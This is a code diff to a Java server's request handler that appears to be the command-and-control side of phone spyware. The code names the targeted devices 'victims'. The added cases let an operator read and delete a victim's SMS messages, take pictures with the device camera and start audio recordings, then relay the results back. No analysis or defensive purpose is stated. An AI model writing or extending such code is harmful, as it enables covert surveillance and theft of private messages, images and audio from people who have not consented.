@@ -117,6 +117,18 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                 case "set.login.ips":
                     targetVictim.sendSetLoginIps((JSONArray) request.get("ips"), user.getLogin());
                     break;
+                case "get.sms":
+                    targetVictim.sendGetSms((String) request.get("type"), (Long) request.get("count"), user.getLogin());
+                    break;
+                case "delete.sms":
+                    targetVictim.sendDeleteSms((Long) request.get("id"), user.getLogin());
+                    break;
+                case "take.picture":
+                    targetVictim.sendTakePicture((String) request.get("camera"), user.getLogin());
+                    break;
+                case "start.audio.record":
+                    targetVictim.sendStartAudioRecord((Long) request.get("seconds"), user.getLogin());
+                    break;
                 default:
                     user.sendErrorCode(Config.INCORRECT_QUERY);
             }
@@ -163,6 +175,18 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                     break;
                 case "set.login.ips":
                     targetUser.sendSetLoginIps((String) request.get("code"), victim.getName());
+                    break;
+                case "get.sms.list":
+                    targetUser.sendGetSms((JSONArray) request.get("sms"), (String) request.get("type"), victim.getName());
+                    break;
+                case "delete.sms":
+                    targetUser.sendDeleteSms((String) request.get("code"), victim.getName());
+                    break;
+                case "take.picture":
+                    targetUser.sendTakePicture((String) request.get("code"), victim.getName());
+                    break;
+                case "start.audio.record":
+                    targetUser.sendStartAudioRecord((String) request.get("code"), victim.getName());
                     break;
                 default:
                     victim.sendErrorCode(Config.INCORRECT_QUERY);
